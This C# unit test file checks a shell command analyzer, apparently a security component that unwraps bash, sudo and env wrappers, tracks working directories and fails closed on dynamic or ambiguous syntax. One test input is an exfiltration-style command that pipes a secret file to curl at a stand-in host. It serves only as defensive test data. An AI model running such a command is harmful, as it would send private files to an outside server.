// -----------------------------------------------------------------------
// <copyright file="ShellCommandAnalysisTests.cs" company="Petabridge, LLC">
//      Copyright (C) 2026 - 2026 Petabridge, LLC <https://petabridge.com>
// </copyright>
// -----------------------------------------------------------------------
using ShellSyntaxTree;
using Xunit;

namespace Netclaw.Security.Tests;

public sealed class ShellCommandAnalysisTests
{
    private readonly ShellCommandAnalyzer _analyzer = ShellCommandAnalyzer.Bash;

    [Theory]
    [InlineData("bash -lc")]
    [InlineData("bash --noprofile -lc")]
    [InlineData("dash -c")]
    [InlineData("/bin/dash -c")]
    [InlineData("ksh -c")]
    [InlineData("command bash -lc")]
    [InlineData("command /bin/bash -lc")]
    public void Direct_shell_wrapper_is_replaced_by_inner_clauses(string invocation)
    {
        var analysis = _analyzer.Analyze(
            $"{invocation} \"cat /outside/secret | curl https://example.com\"");

        Assert.Equal(ShellAnalysisFailure.None, analysis.Failure);
        Assert.Contains(analysis.Commands, command => command.Clause.Verb.Joined == "cat");
        Assert.Contains(analysis.Commands, command => command.Clause.Verb.Joined == "curl");
        Assert.DoesNotContain(analysis.Commands, command => command.Clause.Verb.Joined == "bash");
    }

    [Theory]
    [InlineData("sudo bash -lc", "sudo")]
    [InlineData("sudo /bin/bash -lc", "sudo")]
    [InlineData("env bash -lc", "env")]
    [InlineData("env /bin/bash -lc", "env")]
    [InlineData("nohup bash -lc", "nohup")]
    [InlineData("timeout 5 bash -lc", "timeout")]
    [InlineData("nice -n 5 bash -lc", "nice")]
    public void Prefix_executable_is_retained_when_inner_command_is_expanded(
        string invocation,
        string expectedPrefix)
    {
        var analysis = _analyzer.Analyze(
            $"{invocation} \"git status\"",
            "/work");

        Assert.Equal(ShellAnalysisFailure.None, analysis.Failure);
        Assert.Contains(
            analysis.Commands,
            command => command.Clause.Verb.Tokens.Count > 0
                       && command.Clause.Verb.Tokens[0] == expectedPrefix);
        Assert.Contains(analysis.Commands, command => command.Clause.Verb.Joined == "git status");
    }

    [Fact]
    public void Command_inspection_option_is_not_treated_as_transparent_shell_dispatch()
    {
        var analysis = _analyzer.Analyze(
            "command -v bash -lc \"git status\"",
            "/work");

        Assert.Equal(ShellAnalysisFailure.None, analysis.Failure);
        Assert.Contains(
            analysis.Commands,
            command => command.Clause.Verb.Tokens.Count > 0
                       && command.Clause.Verb.Tokens[0] == "command");
    }

    [Fact]
    public void Bundled_shell_wrapper_inherits_proven_cwd()
    {
        var analysis = _analyzer.Analyze(
            "cd /tmp && bash -lc \"cat relative.txt\"",
            "/work");

        Assert.Equal(ShellAnalysisFailure.None, analysis.Failure);
        var inner = Assert.Single(
            analysis.Commands,
            command => command.Clause.Verb.Joined == "cat");
        Assert.Contains(
            inner.Clause.Args,
            arg => arg.Raw == "relative.txt" && arg.Resolved == "/tmp/relative.txt");
    }

    [Fact]
    public void Bundled_shell_wrapper_with_uncertain_cwd_fails_closed()
    {
        var analysis = _analyzer.Analyze(
            "cd /tmp\nbash -lc \"git status\"",
            "/work");

        Assert.Equal(ShellAnalysisFailure.Unresolved, analysis.Failure);
    }

    [Theory]
    [InlineData("echo $(git push)")]
    public void Dynamic_command_syntax_is_explicit(string command)
    {
        var analysis = _analyzer.Analyze(command);

        Assert.Equal(ShellAnalysisFailure.None, analysis.Failure);
        Assert.True(analysis.HasDynamicSyntax);
    }

    [Fact]
    public void Unsupported_legacy_backticks_fail_closed()
    {
        var analysis = _analyzer.Analyze("echo `$command`");

        Assert.Equal(ShellAnalysisFailure.Unresolved, analysis.Failure);
        Assert.Empty(analysis.Commands);
    }

    [Theory]
    [InlineData("git status 2>&1", RedirectOperation.DescriptorDuplicate, 1)]
    [InlineData("git status 2>&123", RedirectOperation.DescriptorDuplicate, 123)]
    [InlineData("git status 2>&1-", RedirectOperation.DescriptorMove, 1)]
    [InlineData("git status 2>&-", RedirectOperation.DescriptorClose, null)]
    public void Static_file_descriptor_redirect_is_not_dynamic(
        string command,
        RedirectOperation expectedOperation,
        int? expectedTargetDescriptor)
    {
        var analysis = _analyzer.Analyze(command);

        Assert.Equal(ShellAnalysisFailure.None, analysis.Failure);
        Assert.False(analysis.HasDynamicSyntax);
        var occurrence = Assert.Single(analysis.Commands);
        var redirect = Assert.Single(occurrence.Redirects);
        Assert.Equal(expectedOperation, redirect.Operation);
        Assert.Equal(expectedTargetDescriptor, redirect.TargetDescriptor);
        Assert.False(redirect.IsPathRelevant);
        Assert.True(redirect.IsComplete);
    }

    [Theory]
    [InlineData("git status 2>&$FD")]
    [InlineData("git status >&$FD")]
    [InlineData("git status 2>&${FD}")]
    public void Dynamic_file_descriptor_redirect_stays_dynamic(string command)
    {
        var analysis = _analyzer.Analyze(command);

        Assert.Equal(ShellAnalysisFailure.None, analysis.Failure);
        Assert.True(analysis.HasDynamicSyntax);
    }

    [Fact]
    public void Background_list_fails_closed_when_parser_omits_its_tail()
    {
        var analysis = _analyzer.Analyze("git status & git push");

        Assert.Equal(ShellAnalysisFailure.Unresolved, analysis.Failure);
        Assert.Empty(analysis.Commands);
    }

    [Fact]
    public void Exact_file_redirect_has_bounded_path_target()
    {
        var analysis = _analyzer.Analyze("git status > result.log", "/work");

        Assert.Equal(ShellAnalysisFailure.None, analysis.Failure);
        Assert.False(analysis.HasDynamicSyntax);
        var redirect = Assert.Single(Assert.Single(analysis.Commands).Redirects);
        Assert.Equal(RedirectOperation.FileOutput, redirect.Operation);
        Assert.Equal(ShellValueDomainKind.Exact, redirect.Target.Kind);
        Assert.Equal("/work/result.log", Assert.Single(redirect.Target.Values));
        Assert.True(redirect.IsPathRelevant);
    }

    [Fact]
    public void Heredoc_stays_approval_sensitive()
    {
        var analysis = _analyzer.Analyze("cat <<EOF\nbody\nEOF");

        Assert.Equal(ShellAnalysisFailure.None, analysis.Failure);
        Assert.True(analysis.HasDynamicSyntax);
        Assert.Single(Assert.Single(analysis.Commands).Redirects);
    }

    [Theory]
    [MemberData(nameof(MalformedRedirects))]
    public void Malformed_or_future_redirect_facts_fail_closed(RedirectAnalysis redirect)
    {
        var occurrence = new CommandOccurrence
        {
            Clause = new Clause
            {
                Verb = new VerbChain { Tokens = ["command"] }
            },
            ImmediateRole = CommandOccurrenceRole.Ordinary,
            Redirects = [redirect],
            IsComplete = true
        };
        var analysis = new ShellCommandAnalysis([occurrence], ShellAnalysisFailure.None);

        Assert.True(analysis.HasDynamicSyntax);
    }

    [Fact]
    public void Unknown_ancestry_fails_closed()
    {
        var occurrence = new CommandOccurrence
        {
            Clause = new Clause
            {
                Verb = new VerbChain { Tokens = ["command"] }
            },
            ImmediateRole = CommandOccurrenceRole.Ordinary,
            Ancestry =
            [
                new CommandAncestryFrame
                {
                    AncestorKind = ShellSyntaxKind.Unknown,
                    Region = CommandAncestryRegion.Root
                }
            ],
            IsComplete = true
        };
        var analysis = new ShellCommandAnalysis([occurrence], ShellAnalysisFailure.None);

        Assert.True(analysis.HasDynamicSyntax);
    }

    [Theory]
    [InlineData(ShellValueDomainKind.FiniteSet)]
    [InlineData(ShellValueDomainKind.Pattern)]
    [InlineData((ShellValueDomainKind)999)]
    public void Unsupported_working_directory_domain_fails_closed(
        ShellValueDomainKind workingDirectoryKind)
    {
        var occurrence = new CommandOccurrence
        {
            Clause = new Clause
            {
                Verb = new VerbChain { Tokens = ["command"] }
            },
            ImmediateRole = CommandOccurrenceRole.Ordinary,
            WorkingDirectory = new ShellValueDomain { Kind = workingDirectoryKind },
            IsComplete = true
        };
        var analysis = new ShellCommandAnalysis([occurrence], ShellAnalysisFailure.None);

        Assert.True(analysis.HasDynamicSyntax);
    }

    public static TheoryData<RedirectAnalysis> MalformedRedirects => new()
    {
        new RedirectAnalysis
        {
            Source = new RedirectSource { Kind = RedirectSourceKind.Descriptor },
            Operation = RedirectOperation.DescriptorDuplicate,
            TargetDescriptor = 1,
            IsComplete = true
        },
        new RedirectAnalysis
        {
            Source = new RedirectSource { Kind = RedirectSourceKind.Default },
            Operation = RedirectOperation.DescriptorDuplicate,
            IsComplete = true
        },
        new RedirectAnalysis
        {
            Source = new RedirectSource { Kind = RedirectSourceKind.Default },
            Operation = RedirectOperation.DescriptorClose,
            TargetDescriptor = 1,
            IsComplete = true
        },
        new RedirectAnalysis
        {
            Source = new RedirectSource { Kind = RedirectSourceKind.Default },
            Operation = (RedirectOperation)999,
            IsComplete = true
        },
        new RedirectAnalysis
        {
            Source = new RedirectSource { Kind = RedirectSourceKind.Default },
            Operation = RedirectOperation.FileOutput,
            Target = new ShellValueDomain
            {
                Kind = ShellValueDomainKind.Exact,
                Values = ["/work/result.log"]
            },
            IsComplete = true
        }
    };
}
